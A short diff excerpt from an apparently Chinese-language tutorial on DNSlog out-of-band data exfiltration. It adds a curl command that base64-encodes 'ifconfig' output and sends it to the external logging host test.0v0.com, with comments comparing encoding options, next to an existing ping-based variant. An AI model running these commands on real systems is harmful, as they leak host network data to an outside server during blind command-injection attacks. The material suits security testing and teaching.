@@ -166,7 +166,11 @@ ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
 id|base64
 
 使用实例：
+
+curl test.0v0.com/`ifconfig|base64 -w 0` 
+#-w 0 输出内容不换行，推荐这个方法
 curl test.0v0.com/`ifconfig|base64|tr '\n' '-'`
+#将换行符替换为-，这个方法不是很方便，解密的时候还需要替换回来
 ```
 
 ![base64](img/docker+dnslog/base64.png)
